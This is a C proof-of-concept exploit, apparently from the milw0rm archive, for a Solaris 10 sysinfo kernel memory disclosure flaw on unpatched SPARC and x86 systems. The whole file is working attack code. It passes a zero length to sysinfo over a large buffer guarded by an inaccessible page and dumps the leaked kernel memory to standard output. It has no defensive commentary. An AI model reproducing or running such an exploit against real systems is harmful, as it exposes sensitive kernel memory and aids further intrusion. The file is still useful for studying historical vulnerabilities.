/* 07/2006: public release
 * SPARC Solaris 10 without 118833-09
 * x86   Solaris 10 without 118855-06
 *
 * Solaris sysinfo Kernel Memory Disclosure
 * By qaaz
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/systeminfo.h>

#define PAGE_COUNT	1000

int	main(int argc, char *argv[])
{
	char	*buf, *end;
	int	pg = PAGE_COUNT, pagesz, bufsz;

	fprintf(stderr,
		"---------------------------------\n"
		" Solaris sysinfo Kmem Disclosure\n"
		" By qaaz\n"
		"---------------------------------\n");

	if (argc > 1) pg = atoi(argv[1]);

	pagesz = getpagesize();

	bufsz = (pg + 1) * pagesz;
	if (!(buf = memalign(pagesz, bufsz))) {
		perror("malloc");
		return -1;
	}

	memset(buf, 0, bufsz);
	end = buf + (pg * pagesz);

	fprintf(stderr, "-> [ %p .. %p ]\n", buf, end);
	fflush(stderr);

	if (mprotect(end, pagesz, PROT_NONE)) {
		perror("mprotect");
		return -1;
	}

	sysinfo(SI_SYSNAME, buf, 0);

	while (end > buf && end[-1] == 0)
		end--;
	fprintf(stderr, "== %d\n", (int) (end - buf));
	fflush(stderr);

	if (!isatty(1))
		write(1, buf, (size_t) (end - buf));
	return 0;
}

// milw0rm.com [2007-09-01]